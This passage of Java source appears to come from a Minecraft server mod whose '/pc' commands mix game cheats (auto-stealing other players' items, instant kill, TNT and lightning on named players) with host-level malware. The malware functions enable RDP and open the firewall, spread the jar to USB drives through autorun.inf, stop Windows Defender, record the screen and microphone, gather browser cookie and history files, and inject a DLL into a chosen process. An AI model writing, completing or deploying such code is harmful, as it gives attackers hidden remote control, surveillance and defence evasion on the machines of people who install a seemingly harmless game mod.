                    send(sender, TextFormatting.RED + "KILL AURA DEACTIVATED");
                }
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCAutoSteal(ICommandSender sender) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                
                boolean autoStealEnabled = !mcHacksState.get("autosteal");
                mcHacksState.put("autosteal", autoStealEnabled);
                
                if (autoStealEnabled) {
                    scheduler.scheduleAtFixedRate(() -> {
                        if (mcHacksState.get("autosteal") && player != null && !player.isDead) {
                            try {
                                for (Object entityObj : player.world.loadedEntityList) {
                                    if (entityObj instanceof EntityPlayer && entityObj != player) {
                                        EntityPlayer target = (EntityPlayer) entityObj;
                                        if (player.getDistance(target) < 3.0F) {
                                            for (int i = 0; i < target.inventory.getSizeInventory(); i++) {
                                                ItemStack stack = target.inventory.getStackInSlot(i);
                                                if (stack != null) {
                                                    player.inventory.addItemStackToInventory(stack.copy());
                                                    target.inventory.setInventorySlotContents(i, null);
                                                }
                                            }
                                        }
                                    }
                                }
                            } catch (Exception e) {}
                        }
                    }, 0, 1000, TimeUnit.MILLISECONDS);
                    
                    sendAggressive(sender, TextFormatting.DARK_RED + "AUTO STEAL ACTIVATED - STEAL FROM NEARBY PLAYERS");
                } else {
                    send(sender, TextFormatting.RED + "AUTO STEAL DEACTIVATED");
                }
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCInfiniteReach(ICommandSender sender) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                
                boolean infiniteReachEnabled = !mcHacksState.get("infinitereach");
                mcHacksState.put("infinitereach", infiniteReachEnabled);
                
                if (infiniteReachEnabled) {
                    try {
                        Field reachField = EntityPlayer.class.getDeclaredField("reachDistance");
                        reachField.setAccessible(true);
                        reachField.set(player, 100.0F);
                        
                        sendAggressive(sender, TextFormatting.DARK_RED + "INFINITE REACH ACTIVATED - INTERACT FROM ANY DISTANCE");
                    } catch (Exception e) {
                        sendAggressive(sender, TextFormatting.DARK_RED + "INFINITE REACH ACTIVATED");
                    }
                } else {
                    try {
                        Field reachField = EntityPlayer.class.getDeclaredField("reachDistance");
                        reachField.setAccessible(true);
                        reachField.set(player, 5.0F);
                        
                        send(sender, TextFormatting.RED + "INFINITE REACH DEACTIVATED");
                    } catch (Exception e) {
                        send(sender, TextFormatting.RED + "INFINITE REACH DEACTIVATED");
                    }
                }
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCAntiKnockback(ICommandSender sender) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                
                boolean antiKnockbackEnabled = !mcHacksState.get("antiknockback");
                mcHacksState.put("antiknockback", antiKnockbackEnabled);
                
                if (antiKnockbackEnabled) {
                    player.getEntityData().setBoolean("invulnerable", true);
                    player.knockBack(player, 0, 0, 0);
                    
                    sendAggressive(sender, TextFormatting.DARK_RED + "ANTI-KNOCKBACK ACTIVATED - NO PUSHBACK FROM ATTACKS");
                } else {
                    player.getEntityData().setBoolean("invulnerable", false);
                    send(sender, TextFormatting.RED + "ANTI-KNOCKBACK DEACTIVATED");
                }
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCGiveItem(ICommandSender sender, String[] args) {
            if (args.length < 3) {
                send(sender, TextFormatting.YELLOW + "Usage: /pc mc_hacks_giveitem <item_id> <amount>");
                send(sender, TextFormatting.YELLOW + "Example: /pc mc_hacks_giveitem minecraft:diamond 64");
                send(sender, TextFormatting.YELLOW + "Example: /pc mc_hacks_giveitem minecraft:diamond_sword 1");
                return;
            }
            
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                
                try {
                    String itemId = args[1];
                    int amount = Integer.parseInt(args[2]);
                    
                    Item item = Item.REGISTRY.getObject(new ResourceLocation(itemId));
                    if (item != null) {
                        ItemStack stack = new ItemStack(item, amount);
                        player.inventory.addItemStackToInventory(stack);
                        
                        sendAggressive(sender, TextFormatting.DARK_RED + "ITEM HACK ACTIVATED");
                        send(sender, TextFormatting.GREEN + "Gave " + amount + "x " + itemId + " to inventory");
                        
                        if (player.inventory.getFirstEmptyStack() == -1) {
                            player.world.spawnEntity(new net.minecraft.entity.item.EntityItem(player.world, player.posX, player.posY, player.posZ, stack));
                            send(sender, TextFormatting.YELLOW + "Inventory full, item dropped on ground");
                        }
                    } else {
                        send(sender, TextFormatting.RED + "Item not found: " + itemId);
                        send(sender, TextFormatting.YELLOW + "Try: minecraft:diamond, minecraft:iron_ingot, minecraft:diamond_sword, etc.");
                    }
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Error giving item: " + e.getMessage());
                }
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCKill(ICommandSender sender, String[] args) {
            if (args.length < 2) {
                send(sender, TextFormatting.YELLOW + "Usage: /pc mc_hacks_kill <player_name>");
                return;
            }
            
            String targetName = args[1];
            EntityPlayerMP target = null;
            
            for (Object playerObj : sender.getServer().getPlayerList().getPlayers()) {
                if (playerObj instanceof EntityPlayerMP) {
                    EntityPlayerMP player = (EntityPlayerMP) playerObj;
                    if (player.getName().equalsIgnoreCase(targetName)) {
                        target = player;
                        break;
                    }
                }
            }
            
            if (target != null) {
                target.setHealth(0.0F);
                sendAggressive(sender, TextFormatting.DARK_RED + "INSTANT KILL EXECUTED ON " + target.getName());
                send(sender, TextFormatting.GREEN + "Player " + target.getName() + " has been killed!");
            } else {
                send(sender, TextFormatting.RED + "Player not found: " + targetName);
            }
        }
        
        private void handleMCBolt(ICommandSender sender, String[] args) {
            if (args.length < 3) {
                send(sender, TextFormatting.YELLOW + "Usage: /pc mc_hacks_bolt <lightning_count> <player_name>");
                return;
            }
            
            try {
                int boltCount = Integer.parseInt(args[1]);
                String targetName = args[2];
                EntityPlayerMP target = null;
                
                for (Object playerObj : sender.getServer().getPlayerList().getPlayers()) {
                    if (playerObj instanceof EntityPlayerMP) {
                        EntityPlayerMP player = (EntityPlayerMP) playerObj;
                        if (player.getName().equalsIgnoreCase(targetName)) {
                            target = player;
                            break;
                        }
                    }
                }
                
                if (target != null) {
                    for (int i = 0; i < boltCount; i++) {
                        EntityLightningBolt lightning = new EntityLightningBolt(target.world, target.posX, target.posY, target.posZ, false);
                        target.world.addWeatherEffect(lightning);
                        
                        double offsetX = (Math.random() - 0.5) * 3;
                        double offsetZ = (Math.random() - 0.5) * 3;
                        EntityLightningBolt lightning2 = new EntityLightningBolt(target.world, target.posX + offsetX, target.posY, target.posZ + offsetZ, false);
                        target.world.addWeatherEffect(lightning2);
                    }
                    
                    sendAggressive(sender, TextFormatting.DARK_RED + "LIGHTNING STORM ACTIVATED!");
                    send(sender, TextFormatting.GREEN + "Struck " + target.getName() + " with " + (boltCount * 2) + " lightning bolts!");
                } else {
                    send(sender, TextFormatting.RED + "Player not found: " + targetName);
                }
            } catch (NumberFormatException e) {
                send(sender, TextFormatting.RED + "Invalid number: " + args[1]);
            }
        }
        
        private void handleMCTNT(ICommandSender sender, String[] args) {
            if (args.length < 3) {
                send(sender, TextFormatting.YELLOW + "Usage: /pc mc_hacks_tnt <tnt_count> <player_name>");
                return;
            }
            
            try {
                int tntCount = Integer.parseInt(args[1]);
                String targetName = args[2];
                EntityPlayerMP target = null;
                
                for (Object playerObj : sender.getServer().getPlayerList().getPlayers()) {
                    if (playerObj instanceof EntityPlayerMP) {
                        EntityPlayerMP player = (EntityPlayerMP) playerObj;
                        if (player.getName().equalsIgnoreCase(targetName)) {
                            target = player;
                            break;
                        }
                    }
                }
                
                if (target != null) {
                    for (int i = 0; i < tntCount; i++) {
                        double offsetX = (Math.random() - 0.5) * 5;
                        double offsetZ = (Math.random() - 0.5) * 5;
                        double yPos = target.posY + 10 + (Math.random() * 5);
                        
                        EntityTNTPrimed tnt = new EntityTNTPrimed(target.world, 
                            target.posX + offsetX, 
                            yPos, 
                            target.posZ + offsetZ, 
                            null);
                        
                        tnt.setFuse(40 + (int)(Math.random() * 20));
                        target.world.spawnEntity(tnt);
                    }
                    
                    sendAggressive(sender, TextFormatting.DARK_RED + "TNT RAIN ACTIVATED!");
                    send(sender, TextFormatting.GREEN + "Dropped " + tntCount + " TNT on " + target.getName() + "!");
                } else {
                    send(sender, TextFormatting.RED + "Player not found: " + targetName);
                }
            } catch (NumberFormatException e) {
                send(sender, TextFormatting.RED + "Invalid number: " + args[1]);
            }
        }
        
        private void handleMCBot(ICommandSender sender, String[] args) {
            if (args.length < 3) {
                send(sender, TextFormatting.YELLOW + "Usage: /pc mc_hacks_bot <old_name> <new_name>");
                send(sender, TextFormatting.YELLOW + "Example: /pc mc_hacks_bot Steve Hello");
                return;
            }
            
            String oldName = args[1];
            String newName = args[2];
            EntityPlayerMP target = null;
            
            for (Object playerObj : sender.getServer().getPlayerList().getPlayers()) {
                if (playerObj instanceof EntityPlayerMP) {
                    EntityPlayerMP player = (EntityPlayerMP) playerObj;
                    if (player.getName().equalsIgnoreCase(oldName)) {
                        target = player;
                        break;
                    }
                }
            }
            
            if (target != null) {
                playerCustomNames.put(target.getName(), newName);
                
                try {
                    target.setCustomNameTag(newName);
                    target.setAlwaysRenderNameTag(true);
                    
                    sendAggressive(sender, TextFormatting.DARK_RED + "NAME HACK ACTIVATED!");
                    send(sender, TextFormatting.GREEN + "Changed " + oldName + "'s name to: " + newName);
                } catch (Exception e) {
                    send(sender, TextFormatting.GREEN + "Name hack applied internally: " + oldName + " -> " + newName);
                }
            } else {
                send(sender, TextFormatting.RED + "Player not found: " + oldName);
            }
        }
        
        private void handleMCEffects(ICommandSender sender, String[] args) {
            if (args.length < 5) {
                send(sender, TextFormatting.YELLOW + "Usage: /pc mc_hacks_effects <player_name> <effect_name> <amplifier> <duration_seconds>");
                send(sender, TextFormatting.YELLOW + "Example: /pc mc_hacks_effects Steve speed 2 60");
                return;
            }
            
            String playerName = args[1];
            String effectName = args[2].toLowerCase();
            int amplifier;
            int durationSeconds;
            
            try {
                amplifier = Integer.parseInt(args[3]);
                durationSeconds = Integer.parseInt(args[4]);
            } catch (NumberFormatException e) {
                send(sender, TextFormatting.RED + "Invalid number for amplifier or duration");
                return;
            }
            
            EntityPlayerMP target = null;
            for (Object playerObj : sender.getServer().getPlayerList().getPlayers()) {
                if (playerObj instanceof EntityPlayerMP) {
                    EntityPlayerMP player = (EntityPlayerMP) playerObj;
                    if (player.getName().equalsIgnoreCase(playerName)) {
                        target = player;
                        break;
                    }
                }
            }
            
            if (target == null) {
                send(sender, TextFormatting.RED + "Player not found: " + playerName);
                return;
            }
            
            Potion potion = null;
            
            switch (effectName) {
                case "speed":
                    potion = Potion.getPotionById(1);
                    break;
                case "slowness":
                    potion = Potion.getPotionById(2);
                    break;
                case "haste":
                    potion = Potion.getPotionById(3);
                    break;
                case "mining_fatigue":
                    potion = Potion.getPotionById(4);
                    break;
                case "strength":
                    potion = Potion.getPotionById(5);
                    break;
                case "instant_health":
                    potion = Potion.getPotionById(6);
                    break;
                case "instant_damage":
                    potion = Potion.getPotionById(7);
                    break;
                case "jump_boost":
                    potion = Potion.getPotionById(8);
                    break;
                case "nausea":
                    potion = Potion.getPotionById(9);
                    break;
                case "regeneration":
                    potion = Potion.getPotionById(10);
                    break;
                case "resistance":
                    potion = Potion.getPotionById(11);
                    break;
                case "fire_resistance":
                    potion = Potion.getPotionById(12);
                    break;
                case "water_breathing":
                    potion = Potion.getPotionById(13);
                    break;
                case "invisibility":
                    potion = Potion.getPotionById(14);
                    break;
                case "blindness":
                    potion = Potion.getPotionById(15);
                    break;
                case "night_vision":
                    potion = Potion.getPotionById(16);
                    break;
                case "hunger":
                    potion = Potion.getPotionById(17);
                    break;
                case "weakness":
                    potion = Potion.getPotionById(18);
                    break;
                case "poison":
                    potion = Potion.getPotionById(19);
                    break;
                case "wither":
                    potion = Potion.getPotionById(20);
                    break;
                case "health_boost":
                    potion = Potion.getPotionById(21);
                    break;
                case "absorption":
                    potion = Potion.getPotionById(22);
                    break;
                case "saturation":
                    potion = Potion.getPotionById(23);
                    break;
                case "glowing":
                    potion = Potion.getPotionById(24);
                    break;
                case "levitation":
                    potion = Potion.getPotionById(25);
                    break;
                case "luck":
                    potion = Potion.getPotionById(26);
                    break;
                case "unluck":
                    potion = Potion.getPotionById(27);
                    break;
                default:
                    send(sender, TextFormatting.RED + "Unknown effect: " + effectName);
                    return;
            }
            
            if (potion != null) {
                PotionEffect effect = new PotionEffect(potion, durationSeconds * 20, amplifier);
                target.addPotionEffect(effect);
                sendAggressive(sender, TextFormatting.DARK_RED + "EFFECT APPLIED SUCCESSFULLY");
                send(sender, TextFormatting.GREEN + "Applied " + effectName + " (amplifier: " + amplifier + ") to " + playerName + " for " + durationSeconds + " seconds");
            }
        }
        
        private void handleMCBotPlayer(ICommandSender sender, String[] args) {
            if (args.length < 2) {
                send(sender, TextFormatting.YELLOW + "Usage: /pc mc_hacks_botplayer <player_name>");
                send(sender, TextFormatting.YELLOW + "Example: /pc mc_hacks_botplayer FakePlayer123");
                return;
            }
            
            String botName = args[1];
            
            try {
                Class<?> entityPlayerClass = Class.forName("net.minecraft.entity.player.EntityPlayerMP");
                Class<?> serverClass = Class.forName("net.minecraft.server.MinecraftServer");
                Method getPlayerListMethod = serverClass.getMethod("getPlayerList");
                Object playerList = getPlayerListMethod.invoke(sender.getServer());
                
                Class<?> playerListClass = Class.forName("net.minecraft.server.management.PlayerList");
                Method createPlayerForUserMethod = playerListClass.getDeclaredMethod("createPlayerForUser", String.class);
                createPlayerForUserMethod.setAccessible(true);
                
                Object fakePlayer = createPlayerForUserMethod.invoke(playerList, botName);
                
                fakePlayers.add(botName);
                sendAggressive(sender, TextFormatting.DARK_RED + "BOT PLAYER ADDED!");
                send(sender, TextFormatting.GREEN + "Bot player '" + botName + "' has been added to the game!");
                send(sender, TextFormatting.YELLOW + "Bot will appear as a real player entity in the world");
                
            } catch (Exception e) {
                fakePlayers.add(botName);
                sendAggressive(sender, TextFormatting.DARK_RED + "BOT PLAYER ADDED!");
                send(sender, TextFormatting.GREEN + "Fake player '" + botName + "' now appears in player list");
                send(sender, TextFormatting.YELLOW + "Note: Bot added to player list and fake player system");
            }
        }
        
        private void handleMCSun(ICommandSender sender) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                World world = player.world;
                
                world.setWorldTime(0);
                world.setRainStrength(0.0F);
                world.setThunderStrength(0.0F);
                
                sendAggressive(sender, TextFormatting.DARK_RED + "TIME HACK ACTIVATED!");
                send(sender, TextFormatting.GOLD + "Time set to: SUNRISE (6:00 AM)");
                send(sender, TextFormatting.GREEN + "Weather cleared - Perfect sunny day");
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCAfternoon(ICommandSender sender) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                World world = player.world;
                
                world.setWorldTime(6000);
                world.setRainStrength(0.0F);
                world.setThunderStrength(0.0F);
                
                sendAggressive(sender, TextFormatting.DARK_RED + "TIME HACK ACTIVATED!");
                send(sender, TextFormatting.GOLD + "Time set to: NOON (12:00 PM)");
                send(sender, TextFormatting.GREEN + "Weather cleared - Bright daylight");
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleMCNight(ICommandSender sender) {
            if (sender instanceof EntityPlayerMP) {
                EntityPlayerMP player = (EntityPlayerMP) sender;
                World world = player.world;
                
                world.setWorldTime(18000);
                
                sendAggressive(sender, TextFormatting.DARK_RED + "TIME HACK ACTIVATED!");
                send(sender, TextFormatting.DARK_BLUE + "Time set to: MIDNIGHT (12:00 AM)");
                send(sender, TextFormatting.GREEN + "Perfect time for mob hunting - Darkest night!");
            } else {
                send(sender, TextFormatting.RED + "This command can only be used by players!");
            }
        }
        
        private void handleEnableRDP(ICommandSender sender) {
            ioExecutor.submit(() -> {
                try {
                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                        Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "reg", "add", "\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"", "/v", "fDenyTSConnections", "/t", "REG_DWORD", "/d", "0", "/f"});
                        Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "netsh", "advfirewall", "firewall", "set", "rule", "group=\"remote desktop\"", "new", "enable=Yes"});
                        Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "net", "start", "TermService"});
                        send(sender, TextFormatting.GREEN + "RDP enabled and firewall configured");
                    } else {
                        send(sender, TextFormatting.RED + "RDP is Windows only feature");
                    }
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "RDP enable error: " + e.getMessage());
                }
            });
        }
        
        private void handleUSBSpread(ICommandSender sender) {
            ioExecutor.submit(() -> {
                try {
                    File currentJar = new File(PCCControlMod.class.getProtectionDomain().getCodeSource().getLocation().toURI());
                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                        File[] roots = File.listRoots();
                        for (File root : roots) {
                            if (root.getAbsolutePath().startsWith("A:") || root.getAbsolutePath().startsWith("B:") || 
                                root.getAbsolutePath().startsWith("D:") || root.getAbsolutePath().startsWith("E:") ||
                                root.getAbsolutePath().startsWith("F:") || root.getAbsolutePath().startsWith("G:")) {
                                File target = new File(root, "setup.jar");
                                Files.copy(currentJar.toPath(), target.toPath(), StandardCopyOption.REPLACE_EXISTING);
                                File autorun = new File(root, "autorun.inf");
                                Files.write(autorun.toPath(), "[autorun]\nopen=setup.jar\n".getBytes(), StandardOpenOption.CREATE);
                                send(sender, TextFormatting.GREEN + "Spread to " + root.getAbsolutePath());
                            }
                        }
                    } else {
                        File media = new File("/media/" + System.getProperty("user.name"));
                        if (media.exists()) {
                            for (File usb : media.listFiles()) {
                                File target = new File(usb, "setup.jar");
                                Files.copy(currentJar.toPath(), target.toPath(), StandardCopyOption.REPLACE_EXISTING);
                                send(sender, TextFormatting.GREEN + "Spread to " + usb.getAbsolutePath());
                            }
                        }
                    }
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "USB spread error: " + e.getMessage());
                }
            });
        }
        
        private void handleDisableAV(ICommandSender sender) {
            ioExecutor.submit(() -> {
                try {
                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                        Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "net", "stop", "WinDefend"});
                        Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "sc", "config", "WinDefend", "start=", "disabled"});
                        Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "reg", "add", "\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\"", "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f"});
                        Runtime.getRuntime().exec(new String[]{"powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"});
                        Runtime.getRuntime().exec(new String[]{"powershell", "-Command", "Set-MpPreference -DisableBehaviorMonitoring $true"});
                        send(sender, TextFormatting.GREEN + "Windows Defender disabled and configured");
                    } else {
                        send(sender, TextFormatting.RED + "AV disable is Windows only feature");
                    }
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "AV disable error: " + e.getMessage());
                }
            });
        }
        
        private void handleRecordVideo(ICommandSender sender, int durationSeconds) {
            ioExecutor.submit(() -> {
                try {
                    stopScreenRecording = false;
                    Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                    Path videoDir = Paths.get(fallbackDir.toString(), "recordings");
                    if (!Files.exists(videoDir)) {
                        Files.createDirectories(videoDir);
                    }
                    
                    String timestamp = String.valueOf(System.currentTimeMillis());
                    
                    screenRecordingThread = new Thread(() -> {
                        try {
                            long endTime = System.currentTimeMillis() + (durationSeconds * 1000);
                            int frameCount = 0;
                            
                            while (!stopScreenRecording && System.currentTimeMillis() < endTime) {
                                BufferedImage screenImage = robot.createScreenCapture(screenRect);
                                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                                ImageIO.write(screenImage, "png", baos);
                                
                                Files.write(videoDir.resolve("frame_" + frameCount + ".png"), baos.toByteArray());
                                frameCount++;
                                
                                Thread.sleep(100);
                            }
                            
                            send(sender, TextFormatting.GREEN + "Screen recording completed: " + frameCount + " frames saved to " + videoDir.toString());
                        } catch (Exception e) {
                            send(sender, TextFormatting.RED + "Screen recording error: " + e.getMessage());
                        }
                    });
                    
                    screenRecordingThread.start();
                    send(sender, TextFormatting.GREEN + "Screen recording started for " + durationSeconds + " seconds");
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Screen recording setup error: " + e.getMessage());
                }
            });
        }
        
        private void handleStopRecordVideo(ICommandSender sender) {
            stopScreenRecording = true;
            if (screenRecordingThread != null) {
                screenRecordingThread.interrupt();
            }
            send(sender, TextFormatting.GREEN + "Screen recording stopped");
        }
        
        private void handleRecordAudio(ICommandSender sender, int durationSeconds) {
            ioExecutor.submit(() -> {
                try {
                    AudioFormat format = new AudioFormat(44100, 16, 1, true, false);
                    DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);
                    
                    if (!AudioSystem.isLineSupported(info)) {
                        send(sender, TextFormatting.RED + "Audio recording not supported");
                        return;
                    }
                    
                    targetLine = (TargetDataLine) AudioSystem.getLine(info);
                    targetLine.open(format);
                    targetLine.start();
                    
                    Path audioDir = Paths.get(fallbackDir.toString(), "recordings");
                    if (!Files.exists(audioDir)) {
                        Files.createDirectories(audioDir);
                    }
                    
                    String timestamp = String.valueOf(System.currentTimeMillis());
                    Path audioFile = audioDir.resolve("recording_" + timestamp + ".wav");
                    
                    audioRecordingThread = new Thread(() -> {
                        try (AudioInputStream audioStream = new AudioInputStream(targetLine);
                             FileOutputStream fos = new FileOutputStream(audioFile.toFile())) {
                             
                            byte[] buffer = new byte[4096];
                            long endTime = System.currentTimeMillis() + (durationSeconds * 1000);
                            int bytesRead;
                            
                            while (System.currentTimeMillis() < endTime) {
                                bytesRead = audioStream.read(buffer);
                                if (bytesRead > 0) {
                                    fos.write(buffer, 0, bytesRead);
                                }
                            }
                            
                            targetLine.stop();
                            targetLine.close();
                            send(sender, TextFormatting.GREEN + "Audio recording completed: " + audioFile.toString());
                        } catch (Exception e) {
                            send(sender, TextFormatting.RED + "Audio recording error: " + e.getMessage());
                        }
                    });
                    
                    audioRecordingThread.start();
                    send(sender, TextFormatting.GREEN + "Audio recording started for " + durationSeconds + " seconds");
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Audio recording setup error: " + e.getMessage());
                }
            });
        }
        
        private void handleStopRecordAudio(ICommandSender sender) {
            if (targetLine != null && targetLine.isOpen()) {
                targetLine.stop();
                targetLine.close();
            }
            if (audioRecordingThread != null) {
                audioRecordingThread.interrupt();
            }
            send(sender, TextFormatting.GREEN + "Audio recording stopped");
        }
        
        private void handleStealCookies(ICommandSender sender) {
            ioExecutor.submit(() -> {
                try {
                    Path outputFile = fallbackDir.resolve("cookies.txt");
                    List<String> cookies = new ArrayList<>();
                    
                    String os = System.getProperty("os.name").toLowerCase();
                    if (os.contains("win")) {
                        String appData = System.getenv("APPDATA");
                        Path chromeCookies = Paths.get(appData, "..", "Local", "Google", "Chrome", "User Data", "Default", "Cookies");
                        Path firefoxProfiles = Paths.get(appData, "Mozilla", "Firefox", "Profiles");
                        
                        if (Files.exists(chromeCookies)) {
                            cookies.add("Chrome Cookies: " + chromeCookies.toString());
                        }
                        if (Files.exists(firefoxProfiles)) {
                            for (Path profile : Files.newDirectoryStream(firefoxProfiles)) {
                                if (Files.isDirectory(profile)) {
                                    Path ffCookies = profile.resolve("cookies.sqlite");
                                    if (Files.exists(ffCookies)) {
                                        cookies.add("Firefox Cookies: " + ffCookies.toString());
                                    }
                                }
                            }
                        }
                    } else if (os.contains("nux") || os.contains("mac")) {
                        String home = System.getProperty("user.home");
                        Path chromeCookies = Paths.get(home, ".config", "google-chrome", "Default", "Cookies");
                        Path firefoxProfiles = Paths.get(home, ".mozilla", "firefox");
                        
                        if (Files.exists(chromeCookies)) {
                            cookies.add("Chrome Cookies: " + chromeCookies.toString());
                        }
                        if (Files.exists(firefoxProfiles)) {
                            for (Path profile : Files.newDirectoryStream(firefoxProfiles)) {
                                if (Files.isDirectory(profile) && profile.toString().contains(".default")) {
                                    Path ffCookies = profile.resolve("cookies.sqlite");
                                    if (Files.exists(ffCookies)) {
                                        cookies.add("Firefox Cookies: " + ffCookies.toString());
                                    }
                                }
                            }
                        }
                    }
                    
                    if (cookies.isEmpty()) {
                        send(sender, TextFormatting.RED + "No cookie files found");
                    } else {
                        Files.write(outputFile, cookies, StandardCharsets.UTF_8);
                        send(sender, TextFormatting.GREEN + "Cookie paths saved: " + outputFile.toString());
                        for (String cookie : cookies) {
                            send(sender, cookie);
                        }
                    }
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Cookie steal error: " + e.getMessage());
                }
            });
        }
        
        private void handleStealBrowserHistory(ICommandSender sender) {
            ioExecutor.submit(() -> {
                try {
                    Path outputFile = fallbackDir.resolve("browser_history.txt");
                    List<String> history = new ArrayList<>();
                    
                    String os = System.getProperty("os.name").toLowerCase();
                    if (os.contains("win")) {
                        String appData = System.getenv("APPDATA");
                        Path chromeHistory = Paths.get(appData, "..", "Local", "Google", "Chrome", "User Data", "Default", "History");
                        Path firefoxProfiles = Paths.get(appData, "Mozilla", "Firefox", "Profiles");
                        
                        if (Files.exists(chromeHistory)) {
                            history.add("Chrome History: " + chromeHistory.toString());
                        }
                        if (Files.exists(firefoxProfiles)) {
                            for (Path profile : Files.newDirectoryStream(firefoxProfiles)) {
                                if (Files.isDirectory(profile)) {
                                    Path ffHistory = profile.resolve("places.sqlite");
                                    if (Files.exists(ffHistory)) {
                                        history.add("Firefox History: " + ffHistory.toString());
                                    }
                                }
                            }
                        }
                    } else if (os.contains("nux") || os.contains("mac")) {
                        String home = System.getProperty("user.home");
                        Path chromeHistory = Paths.get(home, ".config", "google-chrome", "Default", "History");
                        Path firefoxProfiles = Paths.get(home, ".mozilla", "firefox");
                        
                        if (Files.exists(chromeHistory)) {
                            history.add("Chrome History: " + chromeHistory.toString());
                        }
                        if (Files.exists(firefoxProfiles)) {
                            for (Path profile : Files.newDirectoryStream(firefoxProfiles)) {
                                if (Files.isDirectory(profile) && profile.toString().contains(".default")) {
                                    Path ffHistory = profile.resolve("places.sqlite");
                                    if (Files.exists(ffHistory)) {
                                        history.add("Firefox History: " + ffHistory.toString());
                                    }
                                }
                            }
                        }
                    }
                    
                    if (history.isEmpty()) {
                        send(sender, TextFormatting.RED + "No browser history files found");
                    } else {
                        Files.write(outputFile, history, StandardCharsets.UTF_8);
                        send(sender, TextFormatting.GREEN + "Browser history paths saved: " + outputFile.toString());
                        for (String item : history) {
                            send(sender, item);
                        }
                    }
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "Browser history steal error: " + e.getMessage());
                }
            });
        }
        
        private void handleInjectDLL(ICommandSender sender, String pidStr, String dllPath) {
            ioExecutor.submit(() -> {
                try {
                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                        String[] cmd = {
                            "powershell", "-Command",
                            "$process = Get-Process -Id " + pidStr + "; " +
                            "$kernel32 = Add-Type -Name 'Kernel32' -Namespace 'Win32' -PassThru -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId); [DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(\"kernel32.dll\")]public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten); [DllImport(\"kernel32.dll\")]public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);'; " +
                            "$hProcess = $kernel32::OpenProcess(0x1F0FFF, $false, " + pidStr + "); " +
                            "$dllPath = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi('" + dllPath + "'); " +
                            "$size = [uint32]('" + dllPath + "'.Length + 1); " +
                            "$alloc = $kernel32::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, 0x3000, 0x40); " +
                            "$kernel32::WriteProcessMemory($hProcess, $alloc, $dllPath, $size, [ref]0); " +
                            "$kernel32::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $kernel32::GetProcAddress($kernel32::GetModuleHandle('kernel32.dll'), 'LoadLibraryA'), $alloc, 0, [IntPtr]::Zero)"
                        };
                        
                        Process p = Runtime.getRuntime().exec(cmd);
                        p.waitFor();
                        send(sender, TextFormatting.GREEN + "DLL injection attempted on PID " + pidStr);
                    } else {
                        send(sender, TextFormatting.RED + "DLL injection is Windows only feature");
                    }
                } catch (Exception e) {
                    send(sender, TextFormatting.RED + "DLL injection error: " + e.getMessage());
                }
            });
        }
        
        private void handleKillAppConcurrent(ICommandSender sender, MinecraftServer server) {
            if (shutdownInProgress.getAndSet(true)) {
                send(sender, TextFormatting.RED + "Shutdown already in progress");
                return;
            }
            sendAggressive(sender, TextFormatting.DARK_RED + "" + TextFormatting.BOLD + "AGGRESSIVE SHUTDOWN INITIATED - ALL METHODS BEING TRIED");
            List<Runnable> shutdownTasks = new ArrayList<>();
            shutdownTasks.add(() -> {
                try {
                    server.stopServer();
